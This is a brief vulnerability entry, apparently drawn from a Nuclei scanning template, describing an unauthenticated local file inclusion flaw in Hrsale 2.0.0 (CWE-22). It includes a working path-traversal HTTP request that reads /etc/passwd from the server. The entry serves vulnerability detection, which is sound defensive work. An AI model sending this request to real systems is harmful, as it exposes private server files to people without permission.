# Vulnerability: Hrsale 2.0.0 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`hrsale-unauthenticated-lfi.yaml`)

## Description
Hrsale 2.0.0 is vulnerable to local file inclusion. This exploit allow you to download any readable file from server without permission and login session

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/download?type=files&filename=../../../../../../../../etc/passwd
```

